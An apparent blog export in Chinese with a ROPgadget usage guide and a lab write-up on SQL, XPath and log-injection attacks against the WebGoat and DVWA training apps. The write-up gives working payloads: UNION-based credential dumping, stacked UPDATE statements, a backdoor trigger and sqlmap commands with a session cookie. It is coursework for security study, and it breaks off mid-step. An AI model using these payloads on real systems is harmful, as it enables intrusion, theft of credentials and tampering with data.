    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ROPgadget 工具可以帮助寻找合适的 gadgets，帮助编写ROP exp。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS架构下的 ELF/PE/Mach-O文件格式。<span id="more"></span></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装ROPgadget前，首先需要安装Capstone，一个轻量级的多平台架构支持的反汇编架构。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python setup.py install</span><br><span class="line">ROPgadget --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent] [--align ALIGN] [--mipsrop &lt;rtype&gt;]</span><br></pre></td></tr></table></figure>

<p>参数详解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h, --help           显示帮助文档</span><br><span class="line">-v, --version        版本号</span><br><span class="line">-c, --checkUpdate    检测新版本是否可用</span><br><span class="line">--binary &lt;binary&gt;    指定二进制文件进行分析</span><br><span class="line">--opcode &lt;opcodes&gt;   在可执行段中查找opcode</span><br><span class="line">--string &lt;string&gt;    在可读的段中查找字符串</span><br><span class="line">--memstr &lt;string&gt;    查找单个byte在所有的可执行段中</span><br><span class="line">--depth &lt;nbyte&gt;      搜索引擎的深度(默认10)</span><br><span class="line">--only &lt;key&gt;         只显示特别的指令</span><br><span class="line">--filter &lt;key&gt;       过滤特定指令</span><br><span class="line">--range &lt;start-end&gt;  在地址之间寻找(0x...-0x...)</span><br><span class="line">--badbytes &lt;byte&gt;    拒绝特定指令在gadget的地址下</span><br><span class="line">--rawArch &lt;arch&gt;     指定文件架构: x86|arm|arm64|sparc|mips|ppc</span><br><span class="line">--rawMode &lt;mode&gt;     指定源文件的mode: 32|64|arm|thumb</span><br><span class="line">--rawEndian &lt;endian&gt; 指定源文件的字节顺序: little|big</span><br><span class="line">--re &lt;re&gt;            正则表达式</span><br><span class="line">--offset &lt;hexaddr&gt;   指定gadget的地址偏移</span><br><span class="line">--ropchain           ROP链的生成</span><br><span class="line">--thumb              在ARM架构下使用搜索引擎thumb 模式</span><br><span class="line">--console            使用交互终端对于搜索引擎</span><br><span class="line">--norop              禁止ROP搜索引擎</span><br><span class="line">--nojop              禁止JOP搜索引擎</span><br><span class="line">--callPreceded       仅显示call-preceded的gadgets</span><br><span class="line">--nosys              禁止SYS搜索引擎</span><br><span class="line">--multibr            允许多分枝gadgets</span><br><span class="line">--all                禁止删除重复的gadgets，即显示所有</span><br><span class="line">--noinstr            禁止gadget指令终端打印</span><br><span class="line">--dump               输出gadget bytes</span><br><span class="line">--align ALIGN        对齐gadget地址（以字节为单位）</span><br><span class="line">--mipsrop &lt;rtype&gt;    MIPSj架构下有用的gadget查找器: stackfinder|system|tails|lia0|registers</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --ropchain</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --depth 3</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "main"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string "m..n"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --opcode c9c3</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|ret"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --only "mov|pop|xor|ret"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --filter "xchg|add|sub|cmov.*"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --norop --nosys</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --range 0x08041000-0x08042000</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --string main --range 0x080c9aaa-0x080c9aba</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --memstr "/bin/sh"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --console</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-Linux-x86 --badbytes "00|01-1f|7f|42"</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/Linux_lib64.so --offset 0xdeadbeef00000000</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-ARMv7-ls --depth 5</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/elf-ARM64-bash --depth 5</span><br><span class="line">ROPgadget.py --binary ./test-suite-binaries/raw-x86.raw --rawArch=x86 --rawMode=32</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>ROPgadget</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入实验</title>
    <url>/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C.html</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol>
<li>安装和配置<code>WebGoat</code>与<code>WebScarab</code>；</li>
<li>使用<code>WebGoat</code>，根据提示信息，完成包括<code>Injection Flaw</code>大类下的<code>String SQL</code>注入，<code>Numeric SQL</code>注入，<code>Log Spoofing</code>，<code>XPATH Injection</code>等安全弱点的攻击测试。<span id="more"></span></li>
</ol>
<h1 id="安装和配置WebGoat与WebScarab"><a href="#安装和配置WebGoat与WebScarab" class="headerlink" title="安装和配置WebGoat与WebScarab"></a>安装和配置<code>WebGoat</code>与<code>WebScarab</code></h1><ol>
<li><p>用于测试的主机已经配置完成<code>JAVA</code>环境，在使用<code>WebScarab</code>时只需要在<code>webscarab-selfcontained-20070504-1631.jar</code>文件所在的目录调出命令行，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859620286.png" alt="1565859620286"></p>
</li>
<li><p>使用<code>Vmware</code>安装一个<code>ubuntu</code>虚拟机，镜像选择<code>GameOver.0.1.null.iso</code>，该镜像已经配置好<code>WebGoat</code>环境</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859645909.png" alt="1565859645909"></p>
</li>
<li><p>安装完成后，输入命令行：<code>ifconfig</code>，查看IP地址为<code>192.168.88.149</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859672911.png" alt="1565859672911"></p>
</li>
<li><p>访问URL：<code>http://192.168.88.149:8080/WebGoat/attack</code>，输入用户名<code>guest</code>和密码<code>guest</code>，显示如下页面说明安装成功，点击<code>start WebGoat</code>，然后点击<code>injection flaws</code>进行攻击测试</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859727470.png" alt="1565859727470"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859743879.png" alt="1565859743879"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859750160.png" alt="1565859750160"></p>
</li>
</ol>
<h1 id="String-SQL注入"><a href="#String-SQL注入" class="headerlink" title="String SQL注入"></a><code>String SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，在输入框中输入字符串<code>Levi</code>，显示没有结果匹配，同时显示出查找语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Levi&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>根据该查找语句，输入<code>‘ or 1=1 --</code>，构造语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">-- &#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>--</code>是数据库语言中的注释字符，它的作用是将最后一个单引号变为无效字符，查询语言等同于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data</span><br></pre></td></tr></table></figure>

<p>结果显示user_data中所有的数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565859930271.png" alt="1565859930271"></p>
</li>
</ol>
<h1 id="Numeric-SQL注入"><a href="#Numeric-SQL注入" class="headerlink" title="Numeric SQL注入"></a><code>Numeric SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>并单击，页面中有一个下拉框，点击<code>GO！</code>按钮可以得到查询结果如图所示，同时显示出查找语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station <span class="operator">=</span> <span class="number">101</span></span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860072183.png" alt="1565860072183"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860083941.png" alt="1565860083941"></p>
</li>
<li><p>因为页面中的输入项变成了下拉框，所以没法直接构造查询字符串， 之前的<code>String SQL</code>注入在这里无法完成，需要借助<code>WebScarab</code>代理工具来完成<code>SQL</code>注入攻击，使用之前配置的<code>JAVA</code>环境，在<code>webscarab-selfcontained-20070504-1631.jar</code>所在的目录打开命令行，并输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar webscarab-selfcontained-20070504-1631.jar</span><br></pre></td></tr></table></figure>

<p>打开<code>WebScarab</code>，在<code>Intercept</code>标签中选定<code>Intercept Request</code>，并在<code>Methods</code>中选定<code>POST</code>方法</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860227911.png" alt="1565860227911"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860232723.png" alt="1565860232723"></p>
</li>
<li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860258781.png" alt="1565860258781"></p>
</li>
<li><p>在网页上继续点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。<code>URLEncoded</code>栏中可以看到<code>Request</code>中传递的参数，其中<code>station</code>就是下拉选框的参数，可以看到其值为<code>101</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860336407.png" alt="1565860336407"></p>
</li>
<li><p>将该参数修改为<code>101 or 1=1</code>，构造语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data <span class="keyword">WHERE</span> station <span class="operator">=</span> <span class="number">101</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>查询语言等同于：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> weather_data</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860390596.png" alt="1565860390596"></p>
</li>
<li><p>点击<code>Accept changes</code>按钮提交<code>Request</code>请求，数据库中所有数据内容都显示在页面上</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860424728.png" alt="1565860424728"></p>
</li>
</ol>
<h1 id="Blind-SQL注入"><a href="#Blind-SQL注入" class="headerlink" title="Blind SQL注入"></a><code>Blind SQL</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>Blind SQL injection</code>并单击，跳转到<code>Blind SQL injection</code>页面，根据提示需要盲注以找到正确的<code>first_name</code> (由大小写字母构成)，更改输入框内容，发现只有<code>101</code>是合法的</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860517736.png" alt="1565860517736"></p>
</li>
<li><p>将使用的火狐浏览器设置为同上的手动代理，启动<code>WebScarab</code>，在网页上点击<code>GO!</code> ，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860549367.png" alt="1565860549367"></p>
</li>
<li><p>使用盲注工具<code>JHijack</code>进行盲注，设置<code>HijackData</code>为<code>Numeric</code>，范围为<code>65-122</code>(大小写字母<code>ASCII码</code>范围)，<code>Host</code>设置为该网站的IP地址<code>192.168.88.149</code>，<code>Port</code>设置为<code>8080</code>，URL设置为<code>/WebGoat/attack?Screen=163&amp;menu=1200</code>，方法改为<code>POST</code>，<code>Grep</code>设置为<code>Account number is valid</code>，<code>SESS ID</code>设置为上图中的<code>Cookie</code>内容<code>JSESSIONID=A734E5274D7A7D5D84E2D529D5D3146</code><br><code>4</code>，<code>Hijack Type</code>设置为<code>BODY</code>，<code>Hijack ID</code>设置为<code>account_number=101 AND (SELECT ASCII(SUBSTR(first_name,1,1)) FROM user_data WHERE userid = 15613 ) =$ --</code>，点击<code>Hijack</code>按钮，进行第一个字符的盲注，结果得到第一个字符的<code>ASCII码</code>为<code>74</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860682841.png" alt="1565860682841"></p>
</li>
<li><p>将<code>Hijack ID</code>里面的<code>(first_name,1,1)</code>更改为<code>(first_name,2,1)</code>，点击<code>Hijack</code>，获取第二个字符的<code>ASCII码</code>为<code>111</code>，以此类推，直至到七个字符时，并未获得结果，说明，<code>first_name</code>由六个字符构成，将<code>ASCII码</code>转换成字母为：**<code>Joesph</code>**</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860769818.png" alt="1565860769818"></p>
</li>
<li><p>将正确的<code>first_name：Joseph</code>输入到输入框点击<code>GO!</code> ，注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860799195.png" alt="1565860799195"></p>
</li>
</ol>
<h1 id="Log-Spoofing-日志欺骗"><a href="#Log-Spoofing-日志欺骗" class="headerlink" title="Log Spoofing(日志欺骗)"></a><code>Log Spoofing</code>(日志欺骗)</h1><ol>
<li><p>在左侧菜单中找到<code>Log Spoofing</code>并单击，页面中出现两个输入框，在<code>username</code>输入框输入<code>1‘ or 1=1 --</code>，点击<code>login</code>，查询失败，同时显示：<code>Login failed for username: 1&#39; or 1=1 --</code>，很明显，显示的内容是<code>Web</code>服务器的日志中的记录的内容</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860881715.png" alt="1565860881715"></p>
</li>
<li><p>在输入框中输入<code>1 Login Succeeded for username :</code><br><code>admin</code>，会显示<code>Login failed for username: 1 Login Succeeded for username : admin</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565860912207.png" alt="1565860912207"></p>
</li>
<li><p>利用换行符<code>%0A</code>将输入内容在<code>Login</code>前面分成两行，即在输入框输入：<code>1%0d%0aLogin Succeeded for username:admin</code>，尝试欺骗管理员，点击<code>Login</code>后在日志中显示成功使用户名<code>admin</code>登录，登录日志为<br><code>Login failed for username: 1</code><br><code>Login Succeeded for username:admin</code></p>
<p>(注意：在换行的时候要使用换行符<code>%0A</code>，如果使用回车符<code>%0D</code>则只能显示登录日志，不显示攻击成功)</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861012855.png" alt="1565861012855"></p>
</li>
</ol>
<h1 id="XPATH注入"><a href="#XPATH注入" class="headerlink" title="XPATH注入"></a><code>XPATH</code>注入</h1><ol>
<li><p>在左侧菜单中找到<code>XPATH Injection</code>并单击，页面中出现两个输入框，根据提示在<code>username</code>输入框输入<code>Levi</code>，在<code>username</code>输入框输入<code>test123</code>，点击<code>submit</code>，网页显示<code>Mike</code>的相关信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861154130.png" alt="1565861154130"></p>
</li>
<li><p>在用户名处输入<code>&#39; or 1=1 or &#39;a&#39; = &#39;a</code>,密码任意输入，这样服务器解析后的结果为<code>expression = &quot;/employees/employee[ (loginID/text() = &#39; or 1=1 ) OR ( &#39;a&#39; = &#39;a&#39; and passwd/text () = &#39;password&#39; )]&quot;</code> ，结果显示所有人的信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861244754.png" alt="1565861244754"></p>
</li>
</ol>
<h1 id="LAB-SQL-Injection"><a href="#LAB-SQL-Injection" class="headerlink" title="LAB:SQL Injection"></a><code>LAB:SQL Injection</code></h1><ol>
<li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 1: String SQL Injection</code>并单击，根据网页提示，需要以<code>boss</code>的用户名<code>Neville</code>进行绕过密码登录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861365764.png" alt="1565861365764"></p>
</li>
<li><p>尝试在密码输入栏输入：<code>‘ or 1=1 --</code>，点击<code>Login</code>后显示登录失败</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861388823.png" alt="1565861388823"></p>
</li>
<li><p>查看网页源码，发现输入的密码被限制最大长度为<code>8</code>个字符</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861415462.png" alt="1565861415462"></p>
</li>
<li><p>将网页源码中最大长度修改为<code>20</code>，然后在输入：<code>‘</code><br><code>or 1=1 --</code>，点击<code>Login</code>后，成功绕过密码，显示登录成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861522793.png" alt="1565861522793"></p>
</li>
<li><p>在左侧菜单中找到<code>string SQL injection</code>中的<code>Stage 3: Numeric SQL Injection</code>并单击，根据网页提示，需要以<code>employee</code>账户的用户名<code>Larry</code>进行登录，绕过权限限制，浏览<code>boss</code>的账户信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861561587.png" alt="1565861561587"></p>
</li>
<li><p>在密码输入栏输入：<code>Larry</code>，成功登录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861581845.png" alt="1565861581845"></p>
</li>
<li><p>将使用的火狐浏览器设置为手动代理，地址为<code>127.0.0.1</code>，端口为<code>8008</code>。点击<code>ViewProfile</code>，这时<code>WebScarab</code>会弹出<code>Edit Request</code>窗口，代理设置生效，浏览器的请求经过代理转发。在<code>URLEncoded</code>栏中添加一条参数<code>employee_id</code>，内容是：<code>101 or 1=1 order by salary desc</code>，点击<code>Accept changes</code>提交更改，绕过权限限制，<code>employee</code>账户<code>Larry</code>成功浏览<code>boss</code>的账户信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861666493.png" alt="1565861666493"></p>
</li>
</ol>
<h1 id="Database-Backdoors"><a href="#Database-Backdoors" class="headerlink" title="Database Backdoors"></a>Database Backdoors</h1><ol>
<li><p>在左侧菜单中找到<code>Database Backdoors</code>并单击。根据提示，<code>User ID</code>为<code>101</code>。这个页面可以看到自己的<code>password</code>, <code>ssn</code>和<code>salary</code>。我们需要使用一个易受攻击的字段来创建两条<code>SQL</code>语句并尝试注入另一个更新，将工资更新到更高的级别</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861755893.png" alt="1565861755893"></p>
</li>
<li><p>在输入框中输入<code>101 OR 1=1</code>，尝试注入，结果显示所有<code>User ID</code>的信息，注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861777502.png" alt="1565861777502"></p>
</li>
<li><p>选择<code>User ID</code>为<code>105</code>，将他的<code>Salary</code>由<code>50000</code>更改为<code>900000</code>，输入的内容为：<code>103;UPDATE employee SET salary=900000 WHERE userid=105</code>，点击<code>Submit</code>，显示注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861836101.png" alt="1565861836101"></p>
</li>
<li><p>接下来是创建一个后门，根据提示，输入：<code>105; CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email = &#39;john@hackme.com&#39; WHERE userid = 105</code>，点击<code>Submit</code>，显示注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861901321.png" alt="1565861901321"></p>
</li>
</ol>
<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>针对<code>DVWA</code>演练平台，在<code>SQL Injection</code>攻击实验中，且要求在低级和中级安全级别中，获取用户信息表中全部的用户名及口令信息，并尝试将数据库所有库表数据全部拖出。</p>
<p>在浏览器中输入<code>http://192.168.88.149 /dvwa</code>进入<code>DVWA</code>平台，输入用户名<code>admin</code>，密码<code>password</code>，成功登录平台</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861980984.png" alt="1565861980984"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565861986023.png" alt="1565861986023"></p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="安全级别低级"><a href="#安全级别低级" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p>
</li>
<li><p>选择<code>SQL Injection</code>，输入<code>ID</code>为<code>1</code>，得到结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862076676.png" alt="1565862076676"></p>
</li>
<li><p>尝试输入<code>‘ or 1=1--</code>，得到报错信息，说明表单存在注入漏洞且不是数字型注入</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862098254.png" alt="1565862098254"></p>
</li>
<li><p>尝试字符型注入，输入<code>1’ or ‘1’=’1</code>，成功遍历数据库中的内容</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862121610.png" alt="1565862121610"></p>
</li>
<li><p>测试查询信息列数，输入<code>1’ order by x -- </code> </p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862152256.png" alt="1565862152256"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862157243.png" alt="1565862157243"></p>
<p>当测试到<code>3</code>时，出现报错信息，说明查询结果值为<code>2</code>列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862174858.png" alt="1565862174858"></p>
</li>
<li><p>输入<code>1&#39; union select 1,2 --</code> ，确定字段的顺序为<strong>First name</strong>，<strong>Surname</strong></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862222733.png" alt="1565862222733"></p>
</li>
<li><p>输入<code>1’ union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862284087.png" alt="1565862284087"></p>
</li>
<li><p>输入<code>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39;--</code> ，得知数据库两个表名为<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862325209.png" alt="1565862325209"></p>
</li>
<li><p>选择其中的<code>users</code>表，输入``1’<code> </code>union select 1,column_name from information_schema.columns where table_name=’users’–<code> ，查询</code>user`表的字段名</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862367139.png" alt="1565862367139"></p>
</li>
<li><p>只需要得到用户名和密码，因此输入``1’ union select user,password from users–` ，结果如下</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862400235.png" alt="1565862400235"></p>
<p>其中密码是<code>md5</code>加密，可以使用解码网站解密，如<code>5f4dcc3b5aa765d61d8327deb882cf99</code>解密后为<code>password</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862422877.png" alt="1565862422877"></p>
</li>
</ol>
<h3 id="安全级别中级"><a href="#安全级别中级" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p>
</li>
<li><p>尝试输入<code>1’ or ‘1’=’1</code>，发现报错信息，可以发现安全级别为中级时，对字符进行转义处理</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863258617.png" alt="1565863258617"></p>
</li>
<li><p>尝试数字型注入，输入<code>1 or 1=1</code>，成功查询到所有的数据</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863306258.png" alt="1565863306258"></p>
</li>
<li><p>与低级类似，输入<code>1 union select 1,database() --</code> ，得知数据库名为<code>dvwa</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863334915.png" alt="1565863334915"></p>
</li>
<li><p>同样，输入<code>1 union select user,password from users--</code> ，得到用户名和密码，其中密码是<code>md5</code>加密，可以使用解码网站解密</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863362085.png" alt="1565863362085"></p>
</li>
</ol>
<h2 id="SQLMAP工具注入"><a href="#SQLMAP工具注入" class="headerlink" title="SQLMAP工具注入"></a><code>SQLMAP</code>工具注入</h2><h3 id="安全级别低级-1"><a href="#安全级别低级-1" class="headerlink" title="安全级别低级"></a>安全级别低级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862043052.png" alt="1565862043052"></p>
</li>
<li><p>输入<code>id</code>为<code>1</code>，使用<code>URL</code>在<code>SQLMAP</code>中尝试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">192.168</span><span class="number">.88</span><span class="number">.149</span>/dvwa/vulnerabilities/sqli/?<span class="built_in">id</span>=<span class="number">1</span>&amp;Submit=Submit<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>发现跳转到登陆界面，需要加上<code>cookie</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862650413.png" alt="1565862650413"></p>
</li>
<li><p>在浏览器中查看<code>cookie</code>并记录</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862664106.png" alt="1565862664106"></p>
</li>
<li><p>在<code>SQLMAP</code>目标<code>URL</code>带上<code>cookie</code>重新尝试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862750086.png" alt="1565862750086"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862761063.png" alt="1565862761063"></p>
</li>
<li><p>在命令行中输入：</p>
